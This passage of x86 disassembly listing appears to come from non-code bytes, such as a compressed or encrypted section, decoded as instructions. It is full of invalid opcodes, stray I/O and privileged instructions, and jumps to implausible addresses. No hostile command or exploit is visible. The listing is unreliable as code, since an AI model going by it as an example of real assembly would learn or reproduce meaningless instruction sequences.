  490674:	rcr    BYTE PTR [ebx-0x1a391308],0x24
  49067b:	push   0x3b4c5373
  490680:	je     0x490700
  490682:	fbld   TBYTE PTR [edx-0x69]
  490685:	or     DWORD PTR [eax+edi*4+0x5],ebx
  490689:	ja     0x4906ff
  49068b:	cmp    BYTE PTR [eax],ch
  49068d:	jmp    0xaf85fa61
  490692:	loop   0x490629
  490694:	push   es
  490695:	inc    eax
  490696:	push   ecx
  490697:	bound  ebp,QWORD PTR [esi+0x7b]
  49069a:	imul   eax,DWORD PTR [esi],0xffffffc3
  49069d:	cmp    edi,DWORD PTR [edx+0x2943082b]
  4906a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4906a4:	push   es
  4906a5:	(bad)  
  4906a6:	and    al,0x86
  4906a8:	inc    esp
  4906a9:	and    DWORD PTR [ecx],eax
  4906ab:	(bad)  
  4906ac:	dec    esp
  4906ad:	lock fidivr DWORD PTR [edx+0x2943f02b]
  4906b4:	daa    
  4906b5:	pop    ss
  4906b6:	mov    ebp,DWORD PTR [ebp+0x4601182d]
  4906bc:	jmp    0x4906d8
  4906be:	sbb    DWORD PTR [ecx-0x59],ebp
  4906c1:	inc    ebp
  4906c2:	inc    ecx
  4906c3:	inc    eax
  4906c4:	scas   eax,DWORD PTR es:[edi]
  4906c5:	lock push cs
  4906c7:	jmp    0xf85a0931
  4906cc:	hlt    
  4906cd:	push   ss
  4906ce:	shl    bl,0x0
  4906d1:	mov    ds:0x952bf426,eax
  4906d6:	dec    ebp
  4906d7:	xor    DWORD PTR [ecx+0x173a7946],ecx
  4906dd:	pop    ebx
  4906de:	inc    edi
  4906df:	test   BYTE PTR [ecx-0x27b6f06d],dl
  4906e5:	mov    dh,0x43
  4906e7:	pop    esi
  4906e8:	cmp    al,BYTE PTR [esi+0x55332075]
  4906ee:	shr    DWORD PTR [eax],0xd2
  4906f1:	or     al,0x96
  4906f3:	adc    ebp,eax
  4906f5:	or     esp,ebx
  4906f7:	xor    al,BYTE PTR [ecx+0xc39c2d]
  4906fd:	pop    esi
  4906fe:	inc    esp
  4906ff:	rol    al,1
  490701:	adc    eax,0xee80085
  490706:	fldcw  WORD PTR [ecx+0x41903bf8]
  49070c:	lods   al,BYTE PTR ds:[esi]
  49070d:	jmp    0x435a298d
  490712:	popa   
  490713:	mov    al,BYTE PTR [ebx-0x49]
  490716:	pop    ecx
  490717:	out    dx,eax
  490718:	mov    eax,ds:0x53313ab7
  49071d:	dec    DWORD PTR [ebp-0x41]
  490720:	ret    0x4344
  490723:	(bad)  
  490724:	add    dl,BYTE PTR gs:[esi]
  490727:	pop    eax
  490728:	hlt    
  490729:	je     0x490767
  49072b:	adc    ebp,0x1df89eca
  490731:	adc    eax,0x7083e7c3
  490736:	mov    al,ds:0xc2d78efd
  49073b:	add    dh,BYTE PTR gs:[edi+0xfcb39d7]
  490742:	mov    ebx,0x140b6d40
  490747:	jne    0x4906cc
  490749:	sub    DWORD PTR [ebp+0x52a62c1],eax
  49074f:	and    eax,0xb7d22d3f
  490754:	pop    ebx
  490755:	pushf  
  490756:	cwde   
  490757:	outs   dx,BYTE PTR ds:[esi]
  490758:	xchg   ecx,eax
  490759:	call   0x162874b7
  49075e:	pushf  
  49075f:	add    edi,DWORD PTR [eax+0x1b3f7eb]
  490765:	rcr    DWORD PTR [eax+esi*1+0x17],0xad
  49076a:	mov    ecx,0x32d6ab34
  49076f:	push   ds
  490770:	ds sbb al,0xa9
  490773:	cdq    
  490774:	sbb    ecx,DWORD PTR [ebp-0x22cf83ca]
  49077a:	dec    esi
  49077b:	pop    ebx
  49077c:	lea    ecx,[ecx]
  49077e:	gs and dh,cl
  490781:	pop    esp
  490782:	mov    ah,0x51
  490784:	int3   
  490785:	sub    al,0x82
  490787:	mov    eax,ds:0xd9f08f69
  49078c:	shl    bl,0x1
  49078f:	add    BYTE PTR [edx],ah
  490791:	add    al,0xda
  490793:	in     al,0x67
  490795:	jle    0x4907dd
  490797:	push   edx
  490798:	cdq    
  490799:	inc    ecx
  49079a:	clc    
  49079b:	mov    edx,0x906444eb
  4907a0:	test   BYTE PTR [ebx+0x4],0xd9
  4907a4:	cwde   
  4907a5:	pop    ecx
  4907a6:	adc    BYTE PTR [edx],al
  4907a8:	add    esp,DWORD PTR ds:0x4190645
  4907ae:	add    eax,0x1879215d
  4907b3:	retf   
  4907b4:	shr    ebx,0x44
  4907b7:	xlat   BYTE PTR ds:[ebx]
  4907b8:	push   edi
  4907b9:	bound  esi,QWORD PTR [edx]
  4907bb:	adc    edi,0x1bebfbd7
  4907c1:	pusha  
  4907c2:	inc    edx
  4907c3:	sbb    DWORD PTR [eax+0x185aebdf],ecx
  4907c9:	or     BYTE PTR [edx+0x58398741],dh
  4907cf:	sbb    DWORD PTR [ecx-0x14],eax
  4907d2:	rcl    BYTE PTR [eax-0x13d566f9],0xac
  4907d9:	add    DWORD PTR [esi],esi
  4907db:	cdq    
  4907dc:	mov    ebx,0x70f73c29
  4907e1:	stos   DWORD PTR es:[edi],eax
  4907e2:	jl     0x49085b
  4907e4:	dec    eax
  4907e5:	pop    esp
  4907e6:	xchg   edi,eax
  4907e7:	mov    al,ds:0xdb6093ef
  4907ec:	inc    esp
  4907ed:	nop
  4907ee:	or     esp,edi
  4907f0:	in     eax,0x56
  4907f2:	ret    
  4907f3:	sbb    al,BYTE PTR [eax-0x3d709c8c]
  4907f9:	add    DWORD PTR [edi],esi
  4907fb:	add    bl,ch
  4907fd:	and    al,BYTE PTR [ebx-0x4af94745]
  490803:	dec    edx
  490804:	js     0x490812
  490806:	pop    ebx
  490807:	je     0x490794
  490809:	(bad)  
  49080a:	push   esp
  49080b:	mov    dl,0x55
  49080d:	js     0x49081a
  49080f:	imul   eax,DWORD PTR [edx-0x56],0x23
  490813:	sbb    edi,edx
  490815:	test   cl,al
  490817:	aas    
  490818:	or     DWORD PTR [esi],0xffffff86
  49081b:	aam    0x3
  49081d:	(bad)
  490820:	mov    DWORD PTR [eax-0xf7e8ecb],eax
  490826:	or     cl,bh
  490828:	pop    esp
  490829:	sub    DWORD PTR [ebx],0x5797800c
  49082f:	pop    es
  490830:	cmp    al,0x9e
  490832:	add    al,BYTE PTR [ebx+0x1a]
  490835:	cdq    
  490836:	in     eax,0x1d
  490838:	add    eax,0x8b4adc01
  49083d:	shl    DWORD PTR [esi],cl
  49083f:	xor    eax,0x1820d18d
  490844:	aad    0x89
  490846:	lock outs dx,BYTE PTR ds:[esi]
  490848:	mov    edx,0xbbd7af92
  49084d:	cmp    eax,0x9f7d0583
  490852:	mov    esp,0xeb1254a3
  490857:	sub    eax,eax
  490859:	(bad)  
  49085a:	xchg   esp,eax
  49085b:	adc    esi,0x1cf8d024
  490861:	mov    eax,ds:0x3012c2b3
  490866:	cmp    edx,DWORD PTR [eax]
  490868:	push   DWORD PTR ds:0xa1679396
  49086e:	add    ebx,edx
  490870:	add    bl,BYTE PTR [eax+0x6a]
  490873:	mov    eax,fs:0xb4ee2658
  490879:	lea    ecx,[ebx+0x16e33de5]
  49087f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490880:	inc    edi
  490881:	ret    0xc374
  490884:	mov    bh,0x7
  490886:	lock add eax,0x7a489912
  49088c:	sti    
  49088d:	add    BYTE PTR [esi+edx*2+0x58],0x53
  490892:	mov    eax,ds:0x7058555c
  490897:	cwde   
  490898:	lock xchg edx,eax
  49089a:	popa   
  49089b:	into   
  49089c:	es xchg ebx,eax
  49089e:	ss jle 0x490875
  4908a1:	inc    esp
  4908a2:	shl    edx,1
  4908a4:	sub    BYTE PTR [ebx-0x71decf39],cl
  4908aa:	pop    edx
  4908ab:	scas   eax,DWORD PTR es:[edi]
  4908ac:	push   ecx
  4908ad:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4908af:	(bad)
  4908b2:	sti    
  4908b3:	(bad)  
  4908b4:	bound  ebx,QWORD PTR [esi-0x7e]
  4908b7:	adc    BYTE PTR [edx],bl
  4908b9:	push   edi
  4908ba:	jbe    0x490875
  4908bc:	sub    eax,0x64b8f49e
  4908c1:	in     eax,dx
  4908c2:	add    eax,DWORD PTR es:[ebx+0x3039a3c8]
  4908c9:	adc    edx,0xffffffa5
  4908cc:	inc    esp
  4908cd:	pop    eax
  4908ce:	adc    ah,cl
  4908d0:	jp     0x4908b4
  4908d2:	in     eax,0x3b
  4908d4:	mov    ds:0x1b603558,eax
  4908d9:	push   esp
  4908da:	mov    edi,0xb046ce08
  4908df:	lock je 0x49094a
  4908e2:	or     BYTE PTR [edi+0x78],al
  4908e5:	mov    ds:0xe109bc11,eax
  4908ea:	cmp    eax,DWORD PTR [esi-0x37]
  4908ed:	je     0x4908fa
  4908ef:	pop    ebp
  4908f0:	lock fcmovne st,st(4)
  4908f3:	(bad)  
  4908f4:	pop    ebp
  4908f5:	mov    WORD PTR [ecx-0x1fc88b7d],?
  4908fb:	lock adc BYTE PTR [ebx-0x17],dl
  4908ff:	and    BYTE PTR [ebx],ch
  490901:	add    eax,0x7c31b16f
  490906:	test   dl,al
  490908:	mov    eax,ds:0x75151d60
  49090d:	clc    
  49090e:	pushf  
  49090f:	rcl    BYTE PTR [esi+eax*8-0x45],1
  490913:	ret    
  490914:	fsubr  DWORD PTR [ebp+0x4a]
  490917:	sub    ecx,DWORD PTR [eax]
  490919:	dec    esp
  49091a:	and    bl,BYTE PTR [ebx]
  49091c:	mov    eax,0x8355f0a
  490921:	push   0x48
  490923:	leave  
  490924:	or     eax,DWORD PTR [ecx+0x58]
  490927:	dec    ebx
  490928:	inc    ebx
  490929:	xor    al,0xce
  49092b:	shl    BYTE PTR [edi+eax*8+0x833ec75],0x26
  490933:	pop    edi
  490934:	cmp    al,0x99
  490936:	test   dh,0xc0
  490939:	cs into 
  49093b:	jno    0x490986
  49093d:	inc    esp
  49093e:	add    bp,WORD PTR [edi+0x4f]
  490942:	push   ecx
  490943:	in     eax,dx
  490944:	dec    esp
  490945:	mov    ecx,0x74dea2d1
  49094a:	mov    eax,DWORD PTR [eax-0x3da85be7]
  490950:	mov    dl,0xeb
  490952:	imul   esi,DWORD PTR [ecx+0x1b023e8],0x56086aba
  49095c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49095d:	fild   DWORD PTR [eax]
  49095f:	sbb    dh,BYTE PTR [ebp+0x31275a0e]
  490965:	pop    es
  490966:	push   edx
  490967:	xchg   edi,eax
  490968:	push   es
  490969:	test   al,0xec
  49096b:	data16 shl BYTE PTR [ebp-0xa],0x63
  490970:	inc    edi
  490971:	mov    ebp,0x82d170e
  490976:	push   es
  490977:	mov    esp,0x5d337250
  49097c:	outs   dx,DWORD PTR ds:[esi]
  49097d:	sahf   
  49097e:	pushf  
  49097f:	push   eax
  490980:	jb     0x490982
  490982:	or     dh,al
  490984:	inc    ebx
  490985:	xor    al,0x0
  490987:	and    eax,0x6a08762e
  49098c:	inc    ecx
  49098d:	and    ebp,DWORD PTR [eax+0x7586f388]
  490993:	ja     0x49099d
  490995:	cld    
  490996:	or     BYTE PTR [esi],dh
  490998:	out    dx,al
  490999:	and    eax,edi
  49099b:	inc    ebx
  49099c:	pop    esp
  49099d:	xchg   edx,eax
  49099e:	mov    DWORD PTR [ebx+0x78],0xba5f71f4
  4909a5:	int    0x84
  4909a7:	jl     0x4909aa
  4909a9:	xor    eax,DWORD PTR [eax+0x2409c474]
  4909af:	sub    ch,cl
  4909b1:	repz or al,0x4b
  4909b4:	or     al,0x9d
  4909b6:	add    DWORD PTR [eax+ecx*4-0x3cfae74c],esi
  4909bd:	jmp    0x4c8:0x56602615
  4909c4:	icebp  
  4909c5:	cmp    eax,DWORD PTR [edx+ebx*4+0x785b3a8b]
  4909cc:	in     eax,dx
  4909cd:	paddb  mm3,QWORD PTR [ecx]
  4909d0:	jg     0x4909e6
  4909d2:	loopne 0x490a15
  4909d4:	mov    eax,ds:0xbd450e60
  4909d9:	data16 fisubr WORD PTR [eax+0x33]
  4909dd:	clc    
  4909de:	(bad)  
  4909df:	arpl   WORD PTR [ebp+0x20],dx
  4909e2:	pop    eax
  4909e3:	jp     0x4909c2
  4909e5:	mov    dh,0x27
  4909e7:	or     eax,0xb117a889
  4909ec:	rol    esp,cl
  4909ee:	and    dh,BYTE PTR [ebx-0x268363fd]
  4909f4:	xor    eax,DWORD PTR [esi+0x79483342]
  4909fa:	cmp    al,0x2e
  4909fc:	mov    cl,0x6c
  4909fe:	add    al,0xf9
  490a00:	mov    ecx,0xafc6b80c
  490a05:	rcr    eax,cl
  490a07:	(bad)  
  490a08:	iret   
  490a09:	adc    eax,0x8d600b80
  490a0e:	or     dh,BYTE PTR [edx+ebx*8-0x7f]
  490a12:	or     ch,BYTE PTR [esi]
  490a14:	xchg   ebp,eax
  490a15:	inc    edi
  490a16:	add    BYTE PTR [esi],dh
  490a18:	add    BYTE PTR [ebp+eax*4+0x43],0x6c
  490a1d:	or     bh,ah
  490a1f:	and    edx,0xa543a528
  490a25:	ds pushf 
  490a27:	sbb    DWORD PTR [ebx-0x12],0xffffff9e
  490a2b:	aaa    
  490a2c:	mov    al,ds:0xfa9452ad
  490a31:	cmp    eax,0xd380005
  490a36:	or     ah,BYTE PTR [eax]
  490a38:	pop    ebx
  490a39:	add    cl,BYTE PTR [eax+0x4d27813f]
  490a3f:	inc    ecx
  490a40:	dec    ecx
  490a41:	dec    esi
  490a42:	dec    ecx
  490a43:	inc    ebx
  490a44:	and    DWORD PTR [ecx],esp
  490a46:	mov    bh,0xb1
  490a48:	push   0xffffffc7
  490a4a:	push   edx
  490a4b:	and    dh,bl
  490a4d:	sub    dh,BYTE PTR [ebp-0x2b0fcf7c]
  490a53:	mov    eax,edi
  490a55:	test   al,0xfa
  490a57:	shr    DWORD PTR [eax+0x7bd46e3],0x1b
  490a5e:	pop    esp
  490a5f:	or     al,0x17
  490a61:	xchg   ebx,eax
  490a62:	jbe    0x490ad8
  490a64:	sbb    BYTE PTR [esi+0x44],0xc
  490a68:	repz or BYTE PTR [ecx],cl
  490a6b:	mov    eax,0x46eeee51
  490a70:	sbb    al,0x48
  490a72:	sbb    ebp,ebx
  490a74:	xchg   BYTE PTR [edi],bl
  490a76:	inc    esi
  490a77:	enter  0x3d30,0x51
  490a7b:	test   al,0xc6
  490a7d:	xchg   BYTE PTR [ebp+0x73d700be],bl
  490a83:	out    0xcb,eax
  490a85:	and    BYTE PTR [ebx+0x270c075c],0x8e
  490a8c:	jno    0x490ae4
  490a8e:	jge    0x490a9a
  490a90:	xor    esp,DWORD PTR [edx+ebp*4]
  490a93:	jo     0x490ac6
  490a95:	repz repz pop es
  490a98:	sub    BYTE PTR [ecx],cl
  490a9a:	and    BYTE PTR [esp+ebp*1],ch
  490a9d:	cmp    BYTE PTR [esi+0x15c6c6a4],0xc
  490aa4:	fs adc eax,0x616e5c3f
  490aaa:	repnz cmp al,BYTE PTR [eax]
  490aad:	je     0x490abe
  490aaf:	lods   eax,DWORD PTR ds:[esi]
  490ab0:	push   edx
  490ab1:	and    al,0xc
  490ab3:	push   0xb05b9b3c
  490ab8:	test   ebp,esp
  490aba:	rcl    dl,1
  490abc:	dec    esp
  490abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490abe:	sub    eax,0x869d2bd6
  490ac3:	test   al,0x5
  490ac5:	adc    al,0x90
  490ac7:	sbb    cl,BYTE PTR [esp+eax*1]
  490aca:	cdq    
  490acb:	cwde   
  490acc:	xchg   ebx,eax
  490acd:	sub    al,0x13
  490acf:	(bad)  
  490ad1:	inc    ecx
  490ad2:	add    eax,0x6f4a5b47
  490ad7:	or     edx,DWORD PTR [edx-0x64c06f3f]
  490add:	int    0xf3
  490adf:	daa    
  490ae0:	push   esi
  490ae1:	rcl    DWORD PTR [edx+0x7162e069],0xb2
  490ae8:	dec    ebx
  490ae9:	push   edx
  490aea:	ret    
  490aeb:	sbb    cl,BYTE PTR [esi+0x71f7ac5c]
  490af1:	and    edx,DWORD PTR [ebx]
  490af3:	js     0x490b38
  490af5:	inc    eax
  490af6:	lea    esp,[ebx-0x1bf39288]
  490afc:	fdiv   QWORD PTR [edx-0x23926785]
  490b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490b03:	mov    ecx,0x1d3aa206
  490b08:	inc    esp
  490b09:	test   BYTE PTR [eax+0x74],ch
  490b0c:	or     BYTE PTR [ebp+0x61],ch
  490b0f:	test   DWORD PTR [ecx],ecx
  490b11:	adc    DWORD PTR [edx+0x32],eax
  490b14:	enter  0xaf,0xd4
  490b18:	mov    eax,ds:0x30d47040
  490b1d:	fimul  DWORD PTR [eax-0x4f]
  490b20:	dec    ebx
  490b21:	sbb    esp,ebx
  490b23:	mov    dl,0x91
  490b25:	fiadd  DWORD PTR [ecx]
  490b27:	and    eax,0xd13c04cb
  490b2c:	dec    eax
  490b2d:	out    dx,eax
  490b2e:	ja     0x490ae0
  490b30:	sbb    DWORD PTR [eax+0x35],ecx
  490b33:	jb     0x490aff
  490b35:	test   BYTE PTR ds:0xd2912120,ch
  490b3b:	rcr    BYTE PTR [esi+0x38],0x1e
  490b3f:	and    DWORD PTR [ecx+0x3d1874a1],ecx
  490b45:	shl    BYTE PTR [edx+eax*8+0x286c0638],1
  490b4c:	mov    al,0x34
  490b4e:	mov    esi,DWORD PTR [esi+0x4bdb8694]
  490b54:	sub    ebp,DWORD PTR [ecx-0x389e5712]
  490b5a:	outs   dx,BYTE PTR ds:[esi]
  490b5b:	inc    ecx
  490b5c:	inc    ebx
  490b5d:	sub    BYTE PTR [edi],ch
  490b5f:	repnz and eax,0xdb405901
  490b65:	inc    eax
  490b66:	push   0x3b
  490b68:	mov    bh,0xde
  490b6a:	mov    cl,0x1
  490b6c:	push   edx
  490b6d:	xor    BYTE PTR [eax],dh
  490b6f:	mov    bh,0xd
  490b71:	sub    al,0x10
  490b73:	ret    
  490b74:	dec    ecx
  490b75:	add    BYTE PTR [ebx+0x4f],al
  490b78:	aam    0xe1
  490b7a:	push   0x44f3cd25
  490b7f:	aam    0x96
  490b81:	mov    ecx,0x2b1b80d3
  490b86:	push   edx
  490b87:	push   0xaaad22de
  490b8c:	mov    dl,0xdb
  490b8e:	rol    BYTE PTR [edx+edx*1+0x48],0x2c
  490b93:	sbb    DWORD PTR [ebx],edi
  490b95:	push   ebx
  490b96:	fsubr  QWORD PTR fs:0x19969ea6
  490b9d:	lods   al,BYTE PTR ds:[esi]
  490b9e:	jae    0x490c04
  490ba0:	sbb    ebp,DWORD PTR [eax+0x75]
  490ba3:	push   cs
  490ba4:	sbb    esp,DWORD PTR [ebx+ebx*4+0x6c0d688d]
  490bab:	inc    ebp
  490bac:	js     0x490c26
  490bae:	je     0x490b84
  490bb0:	sbb    esi,DWORD PTR [edx]
  490bb2:	dec    esi
  490bb3:	pusha  
  490bb4:	out    0x1,eax
  490bb6:	jno    0x490bd2
  490bb8:	xor    BYTE PTR [edi],0x27
  490bbb:	aaa    
  490bbc:	ins    DWORD PTR es:[edi],dx
  490bbd:	sbb    BYTE PTR [ebx],cl
  490bbf:	test   dl,dh
  490bc1:	into   
  490bc2:	inc    DWORD PTR [eax]
  490bc4:	test   DWORD PTR [edi],esp
  490bc6:	cld    
  490bc7:	add    ebx,DWORD PTR [edx-0x48]
  490bca:	retf   
  490bcb:	jmp    0x490bfe
  490bcd:	dec    ecx
  490bce:	clc    
  490bcf:	nop
  490bd0:	inc    edi
  490bd1:	sbb    esi,DWORD PTR [esp+esi*1+0x9]
  490bd5:	add    ebx,DWORD PTR [ebx]
  490bd7:	pop    ds
  490bd8:	mov    bh,0x78
  490bda:	inc    esp
  490bdb:	push   es
  490bdc:	add    al,0x1a
  490bde:	mov    al,BYTE PTR [edx+eax*1-0x58a9f485]
  490be5:	nop
  490be6:	rcr    bl,1
  490be8:	jp     0x490bfe
  490bea:	push   ebp
  490beb:	es fs not DWORD PTR es:[eax+0x6134847d]
  490bf4:	fild   WORD PTR [edi]
  490bf6:	dec    esi
  490bf7:	mov    DWORD PTR [eax],ebx
  490bf9:	clc    
  490bfa:	stc    
  490bfb:	js     0x490b88
  490bfd:	sub    DWORD PTR [eax],ebp
  490bff:	das    
  490c00:	push   edi
  490c01:	mov    gs,WORD PTR [ebp-0x6bb636a2]
  490c07:	xchg   edi,eax
  490c08:	mov    ebx,0x8f42f394
  490c0d:	mov    al,ds:0x4b0a816e
  490c12:	add    DWORD PTR [edi],ebx
  490c14:	dec    ecx
  490c15:	cmp    BYTE PTR [edx+0x44f43c90],al
  490c1b:	and    al,0x3e
  490c1d:	dec    ebx
  490c1e:	stc    
  490c1f:	fcomp  DWORD PTR [ecx+0x58]
  490c22:	mov    ebp,eax
  490c24:	je     0x490c84
  490c26:	mov    ds:0xaea03c12,al
  490c2b:	ins    BYTE PTR es:[edi],dx
  490c2c:	pop    ebx
  490c2d:	sub    BYTE PTR [eax-0x3f],cl
  490c30:	add    BYTE PTR [esi+0x6640564e],bl
  490c36:	cs inc ecx
  490c38:	(bad)  
  490c39:	(bad)  
  490c3a:	pop    edi
  490c3b:	nop
  490c3c:	clc    
  490c3d:	daa    
  490c3e:	push   cs
  490c3f:	les    eax,FWORD PTR [ebx+ebp*1+0x68]
  490c43:	adc    eax,DWORD PTR [edx]
  490c45:	fs push cs
  490c47:	jmp    0x4596:0x147a218d
  490c4e:	daa    
  490c4f:	add    DWORD PTR cs:[edi-0x1b],ecx
  490c53:	mov    ebx,0xbc208233
  490c58:	mov    ch,0xd5
  490c5a:	dec    DWORD PTR [ebp-0x6ad8c51b]
  490c60:	lahf   
  490c61:	cwde   
  490c62:	in     eax,dx
  490c63:	mov    eax,0xa090050b
  490c68:	and    al,0xfe
  490c6a:	aam    0xe2
  490c6c:	test   eax,0x832581b2
  490c71:	dec    ebx
  490c72:	cs xchg ebx,eax
  490c74:	mov    ah,0xc3
  490c76:	push   esi
  490c77:	mov    BYTE PTR [eax],al
  490c79:	jmp    0x5ff9:0x828d687
  490c80:	push   es
  490c81:	inc    ebx
  490c82:	es cli 
  490c84:	in     al,0xa8
  490c86:	ret    
  490c87:	cld    
  490c88:	ucomiss xmm5,DWORD PTR [ecx]
  490c8b:	or     eax,0x74bc3782
  490c90:	pop    edx
  490c91:	and    DWORD PTR [esi+0x51],edi
  490c94:	mov    WORD PTR [edi],?
  490c96:	pcmpgtb mm4,QWORD PTR [edx]
  490c99:	js     0x490d10
  490c9b:	inc    edx
  490c9c:	test   eax,0x6fff6a28
  490ca1:	ins    BYTE PTR es:[edi],dx
  490ca2:	inc    ebx
  490ca3:	add    al,0xa3
  490ca5:	fsubr  DWORD PTR [ebp-0xe]
  490ca8:	sbb    DWORD PTR [edx+0x10],0x6
  490cac:	test   al,0x27
  490cae:	or     BYTE PTR [ecx+0x26],al
  490cb1:	nop
  490cb2:	xor    al,0x34
  490cb4:	sbb    al,0x1
  490cb6:	cmp    BYTE PTR [edx+0x71],ah
  490cb9:	pop    es
  490cba:	shl    DWORD PTR [ecx],1
  490cbc:	icebp  
  490cbd:	pop    es
  490cbe:	popa   
  490cbf:	push   esi
  490cc0:	sbb    dh,BYTE PTR [ebp+0x39]
  490cc3:	leave  
  490cc4:	push   es
  490cc5:	and    eax,0x550fa843
  490cca:	sub    eax,0xfc6ca698
  490ccf:	push   esi
  490cd0:	xor    BYTE PTR [eax],ch
  490cd2:	pop    edx
  490cd3:	mov    cl,0xdb
  490cd5:	adc    eax,0x67317370
  490cda:	jne    0x490d03
  490cdc:	adc    al,BYTE PTR [edx+0x7cdcd44b]
  490ce2:	add    cl,BYTE PTR [eax+0x1547757c]
  490ce8:	test   DWORD PTR [esp+edi*1-0x36],0x3aa6b3d2
  490cf0:	add    DWORD PTR [eax+esi*1],esp
  490cf3:	push   esi
  490cf4:	dec    ecx
  490cf5:	jo     0x490d10
  490cf7:	adc    DWORD PTR [eax-0x50],0x6
  490cfb:	sahf   
  490cfc:	pop    ss
  490cfd:	rol    al,0xd2
  490d00:	cmp    al,0x1
  490d02:	cmp    BYTE PTR [ecx],cl
  490d04:	loope  0x490cb4
  490d06:	cwde   
  490d07:	xlat   BYTE PTR ds:[ebx]
  490d08:	sbb    al,0x80
  490d0a:	cwde   
  490d0b:	add    BYTE PTR [eax+edi*1],ch
  490d0e:	push   edi
  490d0f:	das    
  490d10:	ror    BYTE PTR [ecx],cl
  490d12:	ror    BYTE PTR [ecx],0x40
  490d15:	xor    BYTE PTR [edi],cl
  490d17:	enter  0x46d6,0x86
  490d1b:	push   ss
  490d1c:	(bad)  
  490d1d:	mov    ah,0xc0
  490d1f:	dec    ebp
  490d20:	jbe    0x490ccf
  490d22:	test   BYTE PTR [esi],ch
  490d24:	push   0xda3d33a3
  490d29:	aad    0x12
  490d2b:	add    DWORD PTR [eax],edx
  490d2d:	push   ebp
  490d2e:	pop    ecx
  490d2f:	dec    eax
  490d30:	or     al,0xe1
  490d32:	sbb    ch,BYTE PTR [edi+ecx*4]
  490d35:	hlt    
  490d36:	xchg   esp,edi
  490d38:	and    BYTE PTR [edx+0x27],al
  490d3b:	pop    eax
  490d3c:	arpl   si,di
  490d3e:	clc    
  490d3f:	add    eax,0x3d56882c
  490d44:	or     al,0x83
  490d46:	mov    dl,0xda
  490d48:	xchg   esp,eax
  490d49:	sbb    DWORD PTR [ebp+0x412732ab],eax
  490d4f:	loop   0x490cf1
  490d51:	or     eax,0xc30c5ae1
  490d56:	dec    ebx
  490d57:	fcmovu st,st(2)
  490d59:	call   DWORD PTR [edi]
  490d5b:	lods   al,BYTE PTR ds:[esi]
  490d5c:	pop    es
  490d5d:	jmp    0x1c71e47c
  490d62:	adc    BYTE PTR [esp+esi*4-0x2f],dh
  490d66:	cmp    BYTE PTR [ecx-0x4207eddd],ah
  490d6c:	out    0x5c,al
  490d6e:	neg    BYTE PTR [ebx]
  490d70:	aas    
  490d71:	fwait
  490d72:	out    dx,al
  490d73:	mov    ebx,0xf53f806
  490d78:	(bad)  
  490d79:	scas   al,BYTE PTR es:[edi]
  490d7a:	and    ah,0x43
  490d7d:	add    eax,0x9f7f16f8
  490d82:	add    dh,BYTE PTR [esi+esi*4+0x6a]
  490d86:	adc    al,0x0
  490d88:	add    edx,DWORD PTR [edx+0x9]
  490d8b:	inc    eax
  490d8c:	fiadd  DWORD PTR [edx-0x7aff96b]
  490d92:	sbb    BYTE PTR [ecx-0x2],cl
  490d95:	push   es
  490d96:	push   edx
  490d97:	popa   
  490d98:	dec    ebx
  490d99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490d9a:	mov    ebp,0xa617fa1e
  490d9f:	daa    
  490da0:	fistp  DWORD PTR [ecx-0x6313270]
  490da6:	mov    dh,0xf9
  490da8:	test   dh,0x1d
  490dab:	jg     0x490d7a
  490dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490dae:	lods   eax,DWORD PTR ds:[esi]
  490daf:	mov    ah,0x1d
  490db1:	repnz ins DWORD PTR es:[edi],dx
  490db3:	call   0x2871dd2
  490db8:	jle    0x490e1f
  490dba:	rcr    DWORD PTR [edx],cl
  490dbc:	cwde   
  490dbd:	add    DWORD PTR [ebx+0x4e],ebp
  490dc0:	sub    al,0x37
  490dc2:	cmp    al,0x1
  490dc4:	lahf   
  490dc5:	mov    al,ds:0x7f134d93
  490dca:	add    bh,BYTE PTR ds:0xa74f7fdc
  490dd0:	jmp    0x669b1313
  490dd5:	cmp    eax,0xf2291900
  490dda:	jae    0x490ddc
  490ddc:	mov    edx,0x40122dc6
  490de1:	ja     0x490dcd
  490de3:	bound  ebx,QWORD PTR [esi+0x77de76c]
  490de9:	jb     0xe16d0ff9
  490def:	js     0x490e0b
  490df1:	add    eax,0x83b7012d
  490df6:	retf   0xaa76
  490df9:	in     al,dx
  490dfa:	add    edx,DWORD PTR ds:0x9720abdb
  490e00:	out    dx,eax
  490e01:	fnstenv [ecx+edx*4+0x1f]
  490e05:	push   edx
  490e06:	add    al,0x1a
  490e08:	dec    ebx
  490e09:	out    dx,al
  490e0a:	add    eax,0x6c837e7c
  490e0f:	jl     0x490e35
  490e11:	add    al,0x31
  490e13:	xor    DWORD PTR [edi+0x4],esp
  490e16:	shl    dl,0x27
  490e19:	add    BYTE PTR [ebx-0x627da2e5],dl
  490e1f:	add    dl,BYTE PTR [edi-0x5f52d4f0]
  490e25:	sub    ebp,DWORD PTR ds:0xcee2d09
  490e2b:	popf   
  490e2c:	(bad)  
  490e2d:	shr    BYTE PTR [edx+ebx*1],1
  490e30:	icebp  
  490e31:	out    dx,al
  490e32:	les    ecx,FWORD PTR [edi-0xa]
  490e35:	xchg   DWORD PTR [esi-0x10e6aa4d],edx
  490e3b:	je     0x490df1
  490e3d:	out    0x20,eax
  490e3f:	pop    ecx
  490e40:	xor    DWORD PTR [edx+ebx*4+0x11],esi
  490e44:	adc    eax,0x2a95beb9
  490e49:	push   0x2f8f219a
  490e4e:	xor    BYTE PTR [ebx-0x5c],cl
  490e51:	scas   eax,DWORD PTR es:[edi]
  490e52:	neg    BYTE PTR [ebx]
  490e54:	or     al,0x67
  490e56:	pop    esp
  490e57:	pop    ecx
  490e58:	jg     0x490e52
  490e5a:	mov    DWORD PTR [eax],0xd8b4716
  490e60:	xchg   edx,eax
  490e61:	test   eax,0x7819fc17
  490e66:	jecxz  0x490df5
  490e68:	js     0x490e8f
  490e6a:	cmp    eax,0xc0b604c3
  490e6f:	scas   al,BYTE PTR es:[edi]
  490e70:	mov    cl,0xc0
  490e72:	addr16 pop ss
  490e74:	pusha  
  490e75:	and    bl,ch
  490e77:	mov    ebx,DWORD PTR [ebx-0x62]
  490e7a:	xchg   esp,eax
  490e7b:	or     eax,0xaacd4461
  490e80:	and    eax,0x33bf7c85
